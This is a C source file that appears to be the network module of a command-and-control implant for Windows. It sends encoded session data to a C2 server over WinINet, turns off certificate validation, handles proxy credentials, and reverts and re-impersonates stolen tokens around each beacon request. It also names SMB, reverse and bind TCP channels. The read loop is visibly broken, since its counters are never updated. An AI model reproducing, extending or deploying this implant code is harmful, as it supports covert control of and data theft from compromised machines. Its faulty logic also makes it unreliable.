#include "pch.h"

#include "network.h"

#include "identity.h"
#include "metadata.h"
#include "settings.h"
#include "transform.h"

BOOL gNetworkIsInit = FALSE;

void NetworkInit(void)
{
	if (gNetworkIsInit)
		return;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		WSACleanup();
		exit(1);
	}

	// FIXME: DNS Settings here...

	gNetworkIsInit = TRUE;
}

ULONG NetworkGetActiveAdapterIPv4()
{
	SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0);
	if (sock == INVALID_SOCKET)
	{
		return 0;
	}

	DWORD bytesReturned;
	int numInterfaces = 0;
	INTERFACE_INFO interfaceInfo[20];
	if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), &bytesReturned, NULL, NULL))
	{
		numInterfaces = bytesReturned / sizeof(INTERFACE_INFO);
	}

	for (int i = 0; i < numInterfaces; i++)
	{
		if (!(interfaceInfo[i].iiFlags & IFF_LOOPBACK) && interfaceInfo[i].iiFlags & IFF_UP)
		{
			closesocket(sock);
			return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr;
		}
	}

	closesocket(sock);
	return 0;
}

#define PROTOCOL_HTTP 0
#define PROTOCOL_DNS 1
#define PROTOCOL_SMB 2
#define PROTOCOL_TCP_REVERSE 4
#define PROTOCOL_HTTPS 8
#define PROTOCOL_TCP_BIND 16

INTERNET_STATUS_CALLBACK gNetworkStatusCallback;
void NetworkUpdateSettings(HINTERNET hInternet)
{
	if(S_PROTOCOL & PROTOCOL_HTTPS)
	{
		int buffer;
		int length = sizeof(buffer);
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length);
		buffer |= (SECURITY_FLAG_IGNORE_REVOCATION |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_WRONG_USAGE |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID);
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer));
	}

	if (S_HEADERS_REMOVE)
	{
		InternetSetStatusCallback(hInternet, gNetworkStatusCallback);
	}
}

BOOL NetworkCheckResponse(HINTERNET hInternet)
{
	char status[256];
	DWORD statusCodeLength = sizeof(status);
	if (!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, &statusCodeLength, NULL))
		return FALSE;

	return atoi(status) == HTTP_STATUS_OK;
}

HINTERNET gInternetConnect;
DWORD gNetworkOptions;
DWORD gContext;

int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int maxGet)
{
#define MAX_URI 0x400
#define MAX_READ 0x1000
	TRANSFORM transform;
	memset(&transform, 0, sizeof(transform));

	CHAR finalUri[MAX_URI];
	memset(finalUri, 0, sizeof(finalUri));

	TransformInit(&transform, maxGet);
	snprintf(transform.uri, MAX_URI, "%s", uri);

	TransformEncode(&transform, S_C2_REQUEST, session->data, session->length, NULL, 0);

	if(strlen(transform.uriParams))
		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
	else
		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);

	HINTERNET hInternet = HttpOpenRequestA(
		gInternetConnect, 
		"GET", 
		finalUri, 
		NULL, 
		NULL, 
		NULL, 
		gNetworkOptions, 
		&gContext);

	NetworkUpdateSettings(hInternet);

	HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength);
	TransformDestroy(&transform);

	if(!NetworkCheckResponse(hInternet))
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	DWORD bytesAvailable = 0;
	if(!InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0))
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	if (bytesAvailable >= maxGet)
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	if(bytesAvailable == 0)
	{
		InternetCloseHandle(hInternet);
		return 0;
	}

	if(maxGet == 0)
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	int totalBytesRead = 0;
	int bytesRead = 0;
	do
	{
		if(!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable) || bytesRead == 0)
		{
			InternetCloseHandle(hInternet);
			return TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet);
		}
	} while (totalBytesRead < maxGet);

	InternetCloseHandle(hInternet);
	return -1;
}

int NetworkGet(const char* getUri, SESSION* session, char* data, const int maxGet)
{
	IdentityRevertToken();
	int result = NetworkGetInternal(getUri, session, data, maxGet);
	IdentityImpersonateToken();
	return result;
}

#define PROXY_MANUAL 0
#define PROXY_DIRECT 1
#define PROXY_PRECONFIG 2
#define PROXY_MANUAL_CREDS 4

HINTERNET gInternetOpen;
void NetworkConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)
{
	IdentityRevertToken();

	gNetworkOptions = INTERNET_FLAG_RELOAD | // retrieve the original item, not the cache
		INTERNET_FLAG_NO_CACHE_WRITE | // don't add this to the IE cache
		INTERNET_FLAG_KEEP_CONNECTION | // use keep-alive semantics
		INTERNET_FLAG_NO_UI; // no cookie popup

	if(S_PROTOCOL & PROTOCOL_HTTPS)
	{
		gNetworkOptions |= INTERNET_FLAG_SECURE | // use PCT/SSL if applicable (HTTP)
			INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | // ignore date invalid cert errors
			INTERNET_FLAG_IGNORE_CERT_CN_INVALID; // ignore common name invalid cert errors
	}

	DWORD accessType;
	LPCSTR proxy;

	BOOL shouldCreateInternetOpen = TRUE;
	if(S_PROXY_BEHAVIOR == PROXY_MANUAL || S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS)
	{
		accessType = INTERNET_OPEN_TYPE_PROXY;
		proxy = S_PROXY_CONFIG;
	}
	else if(S_PROXY_BEHAVIOR == PROXY_DIRECT)
	{
		accessType = INTERNET_OPEN_TYPE_DIRECT;
		proxy = NULL;
	}
	else if(S_PROXY_BEHAVIOR == PROXY_PRECONFIG)
	{
		accessType = INTERNET_OPEN_TYPE_PRECONFIG;
		proxy = NULL;
	} else
	{
		LERROR("Invalid proxy behavior: %d", S_PROXY_BEHAVIOR);
		shouldCreateInternetOpen = FALSE;
	}

	if(shouldCreateInternetOpen)
	{
		gInternetOpen = InternetOpenA(
			lpszAgent,
			accessType,
			proxy,
			NULL,
			0);
	}

	int timeout = 240000;
	InternetSetOptionA(gInternetOpen, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
	InternetSetOptionA(gInternetOpen, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

	gInternetConnect = InternetConnectA(
		gInternetOpen,
		lpszServerName,
		nServerPort,
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		0,
		0);

	if (S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS)
	{
		InternetSetOptionA(gInternetConnect, INTERNET_OPTION_PROXY_USERNAME, S_PROXY_USER, STRLEN(S_PROXY_USER));
		InternetSetOptionA(gInternetConnect, INTERNET_OPTION_PROXY_PASSWORD, S_PROXY_PASSWORD, STRLEN(S_PROXY_PASSWORD));
	}
	
	IdentityImpersonateToken();
}